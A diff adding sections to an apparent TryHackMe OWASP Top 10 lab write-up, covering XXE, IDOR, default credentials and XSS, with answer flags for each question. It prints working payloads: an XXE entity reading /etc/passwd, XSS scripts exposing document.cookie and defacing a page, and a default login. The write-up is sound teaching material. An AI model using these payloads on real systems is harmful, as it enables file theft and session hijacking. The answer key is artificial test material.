@@ -135,4 +135,155 @@ Now login with the admin credentials.
 
 ...
 
-### Task 12- [Will update it later :-( ]
+### Task 12 - 16 [XML External Entity]
+
+Deploy the machine
+
+In the payload area try to play around with XML payloads.
+
+To see the /etc/passwd we can use the following payload
+
+`<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>`
+
+#### Questions
+...
+
+	1. Full form of XML
+		- Ans: Extensible Markup Language
+	2. Is it compulsory to have XML prolog in XML documents?
+		- Ans: No
+	3. Can we validate XML documents against a schema?
+		- Ans: Yes
+	4. How can we specify XML version and encoding in XML document?
+		- Ans: XML prolog
+	5. How do you define a new ELEMENT?
+		- Ans: !ELEMENT
+	6. How do you define a ROOT element?
+		- Ans: !DOCTYPE
+	7. How do you define a new ENTITY element?
+		- Ans: !ENTITY
+	8. Try the payload mentioned in description on the website.
+		- Ans: No answer needed
+	9. Try to display your own name using any payload.
+		- Ans: No answer needed but use the following script<!--?xml version="1.0" ?-->
+			<!DOCTYPE replace [<!ENTITY example "SU"> ]>
+			 <userInfo>
+  				<firstName>Presden</firstName>
+  				<lastName>&example;</lastName>
+			 </userInfo>
+	10. See if you can read the /etc/passwd
+		- Ans: No answer needed
+	11. What is the name of the user in /etc/passwd?
+		- Ans: Falcon
+	12. Where is falcon's SSH key located?
+		- Ans: /home/falcon/.ssh/id_rsa
+	13. What are the first 18 characters for falcon's private key?
+		- Ans: MIIEogIBAAKCAQEA7b
+
+...
+
+### Task 17-18 [Broken Access Control]
+
+Deploy the machine and login with the credentials given. 
+Once you login into the user account have a look at the url `note.php?note=1`.
+Hmmm let's try to change the note value to 0 and see what happens
+Nice it gave the flag - flag{fivefourthree} 
+
+#### Questions
+...
+
+	1. Read and understand how IDOR works.
+		- Ans: No answer needed
+	2. Deploy the machine and go to http://10.10.201.239 - Login with the username being noot and the password test1234.
+		- Ans: No answer needed
+	3. Look at other users notes. What is the flag?
+		- Ans: flag{fivefourthree} 
+....
+
+### Task 19 [Security Misconfiguration]
+
+Deploy the machine and have a look at the interface
+
+This challenege covers basics of how default passwords are a threat and they should be removed or changes at once.
+
+The title of the webpage says pensive notes lets do some research on it.
+
+Pensive notes is made by  NinjaJc01 on github lets look at that [repo](https://github.com/NinjaJc01/PensiveNotes)
+
+Oh wait there is default password available lets login with it `pensive:PensiveNotes`.
+
+Nice we now have the flag
+
+#### Questions
+
+...
+
+	1. Deploy the VM
+		- Ans: No answer needed
+	2. Hack into the webapp, and find the flag!
+	 	- Ans: thm{4b9513968fd564a87b28aa1f9d672e17}
+
+...
+
+### Task 20 [XSS - Cross Site Scripting]
+
+This challenge covers basic 3 XSS Cross Site Scripting attacks Stored, Reflective and DOM
+
+For Reflected challenge we were given to pop up hello and our machin IP as pop ups to get the flag.
+
+`<script>alert("Hello")</script>` pops up Hello
+`<script>alert(window.location.host)</script>` pops up our IP
+
+For stored xss
+We first need to register and we will be the given something that is similar to that of global messaging fourm.
+
+Now lets get back to scripting
+
+Lets use the following sciprt
+
+To manipulate html tags
+...
+	
+	<html>
+	<body>
+	<h1>Buhahaha</h1>
+	<button type="button" onclick="alert('GG!')">Click Me</button>
+	</body>
+	</html>
+
+...
+
+To get cookis as a pop-up
+
+...
+
+	<script>alert(document.cookie)</script>
+...
+
+To deface a website using JS and html manipulation.
+
+...
+
+	<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>
+...
+
+#### Questions
+
+...
+
+	1.  Deploy the VM
+		- Ans: No answer needed
+	2. Navigate to http://10.10.244.98/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".
+		- Ans: ThereIsMoreToXSSThanYouThink
+	3. On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.
+		- Ans: ReflectiveXss4TheWin
+	4. Then add a comment and see if you can insert some of your own HTML.
+		- Ans: HTML_T4gs
+	5. On the same page, create an alert popup box appear on the page with your document cookies.
+		- Ans: W3LL_D0N3_LVL2
+	6. Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.
+		- Ans: websites_can_be_easily_defaced_with_xss
+
+...
+
+### Task 21 - To be continued...
